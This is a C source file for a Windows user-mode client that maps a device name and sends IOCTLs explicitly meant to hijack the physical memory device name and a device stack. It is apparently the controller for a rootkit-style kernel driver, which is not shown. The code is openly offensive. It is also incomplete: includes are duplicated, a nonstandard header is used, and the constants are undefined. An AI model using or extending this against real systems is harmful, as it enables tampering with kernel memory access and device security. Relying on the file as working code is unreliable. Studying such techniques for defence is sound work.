#include <Windows.h>
#include <stdio.h>
#include <conio.h>
#include <ioctl.h>

#include <stdio.h>
#include <conio.h>
#include <windows.h>

/**
 * Entry point of the user-mode application. 
 * This program attempts to hijack the physical memory device name 
 * and the device stack via IOCTL commands.
 *
 * @param argc The number of command-line arguments.
 * @param argv The command-line arguments.
 * 
 * @return Returns 0 for success and a non-zero error code for failure.
 */
int main(int argc, char* argv[])
{
    int rc = 0;                                    // Result code
    HANDLE device = INVALID_HANDLE_VALUE;          // Handle to the device
    DWORD returned;                                // Bytes returned (unused)

    // Map the NT device name to a DOS device name
    if (!DefineDosDeviceW(DDD_RAW_TARGET_PATH, DEVICE_NAME_STRING, NTDEVICE_NAME_STRING)) {
        return (int)GetLastError();
    }

    // Attempt to open the device
    device = CreateFileW(SYMBOLIC_NAME_STRING, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        // On failure, remove the DOS device name and return error
        (void) DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_EXACT_MATCH_ON_REMOVE | DDD_REMOVE_DEFINITION, DEVICE_NAME_STRING, NTDEVICE_NAME_STRING);
        return (int)GetLastError();
    }

    // Attempt to hijack the physical memory device name using an IOCTL command
    printf("Attempting hijack of physical memory device name\n");
    if (!DeviceIoControl(device, IOCTL_HIJACK_NAME, NULL, 0, NULL, 0, &returned, NULL)) {
        rc = GetLastError();
    }

    // Wait for the user to press a key
    printf("Press key to continue\n");
    (void) _getch();

    // Attempt to hijack the device stack using an IOCTL command
    printf("Attempting hijack of device stack\n");
    if (!DeviceIoControl(device, IOCTL_HIJACK_STACK, NULL, 0, NULL, 0, &returned, NULL)) {
        rc = GetLastError();
    }

    // Clean up: Remove the DOS device name and close the device handle
    (void)DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_EXACT_MATCH_ON_REMOVE | DDD_REMOVE_DEFINITION, DEVICE_NAME_STRING, NTDEVICE_NAME_STRING);
    CloseHandle(device);

    return rc;
}
